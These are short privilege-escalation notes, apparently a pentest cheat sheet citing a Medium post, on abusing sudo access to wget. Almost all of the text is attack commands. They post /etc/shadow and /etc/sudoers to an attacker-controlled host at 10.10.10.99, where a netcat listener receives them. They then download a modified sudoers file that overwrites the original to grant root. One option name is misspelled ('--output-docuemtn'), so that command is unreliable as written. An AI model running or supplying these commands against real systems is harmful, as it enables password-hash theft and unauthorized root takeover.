<https://rootrecipe.medium.com/unique-priv-esc-methods-3a11d9dc94f>

Shadow technique:
```
sudo wget --post-file=/etc/shadow 10.10.10.99
rlwrap nc -lvnp 80
```

(then we receive the shadow file and might be able to crack it for the user to sudo su or to another user)

Sudoers technique:
```
sudo wget --post-file=/etc/sudoers 10.10.10.99
```
# Edit the file so the user we are imitading has (root) NOPASSWD: ALL permissions
# Download the file back to the target machine and it'll overwrite the original sudoers file:
sudo wget 10.10.10.99/modified_sudoers --output-docuemtn=/etc/sudoers
# Run "sudo su" to get root
sudo su